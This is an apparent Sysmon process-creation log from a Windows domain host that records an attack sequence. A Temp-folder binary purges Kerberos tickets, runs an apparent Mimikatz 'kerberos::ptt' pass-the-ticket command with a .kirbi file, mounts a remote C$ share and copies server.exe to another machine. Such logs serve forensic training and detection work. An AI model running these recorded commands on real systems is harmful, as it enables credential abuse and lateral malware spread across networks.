情報,2019/11/07 16:10:13,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:10:13.402
ProcessGuid: {02EA0504-5C55-5A01-0000-00100C001300}
ProcessId: 2200
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""1009238107-592299765-1064907537-564367463-211739964311103720272388828481763882392""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:10:13,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:10:13.402
ProcessGuid: {02EA0504-5C55-5A01-0000-001094FF1200}
ProcessId: 2656
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""copy C:\Intel\Logs\server.exe \\Win7_64JP_03\c$\Intel\Logs\server.exe""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 16:10:02,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:10:02.295
ProcessGuid: {02EA0504-5BB9-5A01-0000-0010829F1200}
ProcessId: 2612
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 16:09:55,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:09:55.400
ProcessGuid: {02EA0504-5C43-5A01-0000-001022FC1200}
ProcessId: 2180
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 16:09:55,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:09:55.400
ProcessGuid: {02EA0504-5C43-5A01-0000-0010AAFB1200}
ProcessId: 1364
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 16:09:55,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:09:55.400
ProcessGuid: {02EA0504-5C43-5A01-0000-001062FD1200}
ProcessId: 2152
Image: C:\Windows\SysWOW64\net.exe"
情報,2019/11/07 16:09:55,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:09:55.369
ProcessGuid: {02EA0504-5C43-5A01-0000-001062FD1200}
ProcessId: 2152
Image: C:\Windows\SysWOW64\net.exe
CommandLine: net  use \\Win7_64JP_03\c$
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=9A544E2094273741AA2D3E7EA0AF303AF2B587EA
ParentProcessGuid: {02EA0504-5C43-5A01-0000-0010AAFB1200}
ParentProcessId: 1364
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""net use \\Win7_64JP_03\c$"""
情報,2019/11/07 16:09:55,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:09:55.338
ProcessGuid: {02EA0504-5C43-5A01-0000-001022FC1200}
ProcessId: 2180
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""1147167495-1419676949-726449530-72132199-2004977440-1417737552-2036662671158460362""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:09:55,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:09:55.338
ProcessGuid: {02EA0504-5C43-5A01-0000-0010AAFB1200}
ProcessId: 1364
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""net use \\Win7_64JP_03\c$""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 16:09:37,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:09:37.320
ProcessGuid: {02EA0504-5C31-5A01-0000-00108DF81200}
ProcessId: 2448
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 16:09:37,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:09:37.320
ProcessGuid: {02EA0504-5C31-5A01-0000-001015F81200}
ProcessId: 2548
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 16:09:37,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:09:37.320
ProcessGuid: {02EA0504-5C31-5A01-0000-0010CBF91200}
ProcessId: 2596
Image: C:\Intel\Logs\mz.exe"
情報,2019/11/07 16:09:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:09:37.304
ProcessGuid: {02EA0504-5C31-5A01-0000-0010CBF91200}
ProcessId: 2596
Image: C:\Intel\Logs\mz.exe
CommandLine: C:\Intel\Logs\mz.exe  ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=53796614833D7596FF9F6BFD59E55D668089A00F
ParentProcessGuid: {02EA0504-5C31-5A01-0000-001015F81200}
ParentProcessId: 2548
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit"""
情報,2019/11/07 16:09:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:09:37.273
ProcessGuid: {02EA0504-5C31-5A01-0000-00108DF81200}
ProcessId: 2448
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""3837896352073443352111430382-1836908658-616991934322938431607017737-1317758253""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:09:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:09:37.273
ProcessGuid: {02EA0504-5C31-5A01-0000-001015F81200}
ProcessId: 2548
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 16:09:09,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:09:09.146
ProcessGuid: {02EA0504-5C15-5A01-0000-001033F61200}
ProcessId: 2844
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 16:09:09,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:09:09.146
ProcessGuid: {02EA0504-5C15-5A01-0000-00108FF51200}
ProcessId: 900
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 16:09:09,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:09:09.130
ProcessGuid: {02EA0504-5C15-5A01-0000-001033F61200}
ProcessId: 2844
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-7744587482994926316820302992081219644-1489847175-1007209936-20847475771930131031""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:09:09,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:09:09.115
ProcessGuid: {02EA0504-5C15-5A01-0000-00108FF51200}
ProcessId: 900
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""klist purge""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 16:08:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:08:46.662
ProcessGuid: {02EA0504-5BFE-5A01-0000-00100AEC1200}
ProcessId: 2544
Image: C:\Windows\System32\klist.exe"
情報,2019/11/07 16:08:46,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:08:46.646
ProcessGuid: {02EA0504-5BFE-5A01-0000-00100AEC1200}
ProcessId: 2544
Image: C:\Windows\System32\klist.exe
CommandLine: klist  purge
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=18FDDCEA4020617F6F0A8FFEC1404CC61EA42ECE
ParentProcessGuid: {02EA0504-5BEE-5A01-0000-0010FFE31200}
ParentProcessId: 708
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\system32\cmd.exe"" "
情報,2019/11/07 16:08:36,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:08:36.896
ProcessGuid: {02EA0504-5BF4-5A01-0000-00100CEB1200}
ProcessId: 600
Image: C:\Windows\System32\klist.exe"
情報,2019/11/07 16:08:36,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:08:36.787
ProcessGuid: {02EA0504-5BF4-5A01-0000-00100CEB1200}
ProcessId: 600
Image: C:\Windows\System32\klist.exe
CommandLine: klist
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=18FDDCEA4020617F6F0A8FFEC1404CC61EA42ECE
ParentProcessGuid: {02EA0504-5BEE-5A01-0000-0010FFE31200}
ParentProcessId: 708
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""C:\Windows\system32\cmd.exe"" "
情報,2019/11/07 16:08:32,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 07:08:32.138
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\AC70VPBBL2621P5FHSD4.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 07:08:32.138"
情報,2019/11/07 16:08:30,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:08:30.984
ProcessGuid: {02EA0504-5BEE-5A01-0000-001089E41200}
ProcessId: 2704
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-440099524174971565-1143599840-877539560-939282375-182804523-179005750-1170581806""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:08:30,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:08:30.984
ProcessGuid: {02EA0504-5BEE-5A01-0000-0010FFE31200}
ProcessId: 708
Image: C:\Windows\System32\cmd.exe
CommandLine: ""C:\Windows\system32\cmd.exe"" 
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8
ParentProcessGuid: {02EA0504-41EC-5A01-0000-001019C60100}
ParentProcessId: 1988
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE"
情報,2019/11/07 16:07:48,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:07:48.058
ProcessGuid: {02EA0504-5BB9-5A01-0000-0010C2BE1200}
ProcessId: 2516
Image: C:\Windows\System32\Macromed\Flash\FlashUtil64_22_0_0_210_ActiveX.exe"
情報,2019/11/07 16:07:47,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 07:07:47.949
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\MT3FLT6IKRBOAKSO7A4C.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 07:07:47.949"
情報,2019/11/07 16:07:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:07:37.466
ProcessGuid: {02EA0504-5BB9-5A01-0000-0010C2BE1200}
ProcessId: 2516
Image: C:\Windows\System32\Macromed\Flash\FlashUtil64_22_0_0_210_ActiveX.exe
CommandLine: C:\Windows\system32\Macromed\Flash\FlashUtil64_22_0_0_210_ActiveX.exe -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=4333BFE126CAEAFDB0A80530F0C05A06C51EB2B8
ParentProcessGuid: {02EA0504-41A7-5A01-0000-001060A00000}
ParentProcessId: 636
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 16:07:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:07:37.029
ProcessGuid: {02EA0504-5BB9-5A01-0000-0010829F1200}
ProcessId: 2612
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2736 CREDAT:3282207 /prefetch:2
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\Desktop\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=7CB7EF5B277663E56167E1E7705D7C8BFC4BD432
ParentProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ParentProcessId: 2736
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 16:07:22,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:07:22.958
ProcessGuid: {02EA0504-5B63-5A01-0000-0010C5771200}
ProcessId: 2496
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 16:06:24,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:06:24.614
ProcessGuid: {02EA0504-5B70-5A01-0000-0010F29C1200}
ProcessId: 2404
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 16:06:24,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:06:24.598
ProcessGuid: {02EA0504-5B70-5A01-0000-00104B9C1200}
ProcessId: 856
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 16:06:24,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:06:24.582
ProcessGuid: {02EA0504-5B70-5A01-0000-0010F29C1200}
ProcessId: 2404
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""553803631-2055344591-819267367-859924596-296264476221943967-903544354-142579510""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A6-5A01-0000-001010810000}
ParentProcessId: 428
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:06:24,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:06:24.567
ProcessGuid: {02EA0504-5B70-5A01-0000-00104B9C1200}
ProcessId: 856
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""copy C:\Intel\Logs\server.exe \\Win7_64JP_03\c$\Intel\Logs\server.exe""
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-41EE-5A01-0000-0010421D0200}
ParentProcessId: 204
ParentImage: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe
ParentCommandLine: ""C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Local\Temp\notilv.exe"" "
情報,2019/11/07 16:06:22,Microsoft-Windows-Sysmon,2,File creation time changed (rule: FileCreateTime),"File creation time changed:
UtcTime: 2019-11-07 07:06:22.086
ProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ProcessId: 2736
Image: C:\Program Files\Internet Explorer\iexplore.exe
TargetFilename: C:\Users\chiyoda.tokyo.EXAMPLE\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\K1DD0DHRYFEX2OJWTBKK.temp
CreationUtcTime: 2019-11-07 05:26:24.114
PreviousCreationUtcTime: 2019-11-07 07:06:22.086"
情報,2019/11/07 16:06:11,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:06:11.224
ProcessGuid: {02EA0504-5B63-5A01-0000-0010C5771200}
ProcessId: 2496
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:2736 CREDAT:1774974 /prefetch:2
CurrentDirectory: C:\Users\chiyoda.tokyo.EXAMPLE\Desktop\
User: EXAMPLE\chiyoda.tokyo
LogonGuid: {02EA0504-41EA-5A01-0000-002074B30100}
LogonId: 0x1b374
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=7CB7EF5B277663E56167E1E7705D7C8BFC4BD432
ParentProcessGuid: {02EA0504-485D-5A01-0000-0010DB380900}
ParentProcessId: 2736
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 16:06:04,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:06:04.142
ProcessGuid: {02EA0504-5B5B-5A01-0000-001003751200}
ProcessId: 2396
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 16:06:04,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:06:04.142
ProcessGuid: {02EA0504-5B5B-5A01-0000-00105D741200}
ProcessId: 2412
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 16:06:04,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:06:04.142
ProcessGuid: {02EA0504-5B5B-5A01-0000-0010EC751200}
ProcessId: 1076
Image: C:\Windows\SysWOW64\net.exe"
情報,2019/11/07 16:06:03,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:06:03.970
ProcessGuid: {02EA0504-5B5B-5A01-0000-0010EC751200}
ProcessId: 1076
Image: C:\Windows\SysWOW64\net.exe
CommandLine: net  use \\Win7_64JP_03\c$
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=9A544E2094273741AA2D3E7EA0AF303AF2B587EA
ParentProcessGuid: {02EA0504-5B5B-5A01-0000-00105D741200}
ParentProcessId: 2412
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""net use \\Win7_64JP_03\c$"""
情報,2019/11/07 16:06:03,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:06:03.970
ProcessGuid: {02EA0504-5B5B-5A01-0000-001003751200}
ProcessId: 2396
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe ""-1880948768-1645913727970854104132491740228650110-1222357498-1266079116903987819""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=D836FCE5EE3175E5178DADD40E1FEC98A83FBCE9
ParentProcessGuid: {02EA0504-41A1-5A01-0000-00105F7E0000}
ParentProcessId: 360
ParentImage: C:\Windows\System32\csrss.exe
ParentCommandLine: %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16"
情報,2019/11/07 16:06:03,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 07:06:03.955
ProcessGuid: {02EA0504-5B5B-5A01-0000-00105D741200}
ProcessId: 2412
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""net use \\Win7_64JP_03\c$""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {02EA0504-41A6-5A01-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5
ParentProcessGuid: {02EA0504-584C-5A01-0000-0010E1C11000}
ParentProcessId: 2604
ParentImage: C:\Intel\Logs\win.exe
ParentCommandLine: C:\Intel\Logs\win.exe"
情報,2019/11/07 16:05:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:05:46.233
ProcessGuid: {02EA0504-5B49-5A01-0000-001099711200}
ProcessId: 2840
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 16:05:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 07:05:46.233
